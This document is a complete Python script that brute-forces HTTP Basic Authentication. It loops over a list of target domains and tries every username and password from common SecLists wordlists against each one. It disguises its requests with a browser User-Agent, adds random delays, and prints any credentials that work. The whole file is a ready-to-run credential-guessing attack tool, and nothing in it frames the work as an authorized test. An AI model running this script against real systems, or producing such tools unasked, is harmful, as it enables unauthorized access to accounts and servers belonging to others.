#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth
import time
import random

# === CONFIGURATION ===
domains_file = "domains.txt"      # file with target domains, one per line
usernames_file = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"  # file with usernames, one per line
passwords_file = "/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt"  # file with passwords, one per line

# Optional headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    # add other headers if needed (Cookies, Sec-Ch-Ua, etc.)
}

# === LOAD FILES ===
with open(domains_file) as f:
    domains = [line.strip() for line in f if line.strip()]

with open(usernames_file) as f:
    usernames = [line.strip() for line in f if line.strip()]

with open(passwords_file) as f:
    passwords = [line.strip() for line in f if line.strip()]

# === BRUTE-FORCE LOOP ===
for domain in domains:
    print(f"\n[+] Testing domain: {domain}")
    for username in usernames:
        for password in passwords:
            try:
                response = requests.get(
                    domain,
                    headers=headers,
                    auth=HTTPBasicAuth(username, password),
                    timeout=10,
                    allow_redirects=True
                )
                if response.status_code == 200:
                    print(f"[SUCCESS] {domain} -> {username}:{password}")
                    break  # stop after first successful password for this username
                else:
                    print(f"[FAIL] {domain} -> {username}:{password} ({response.status_code})")
            except requests.RequestException as e:
                print(f"[ERROR] {domain} -> {username}:{password} ({e})")
            # optional delay to reduce load
            time.sleep(random.uniform(0.5, 2))
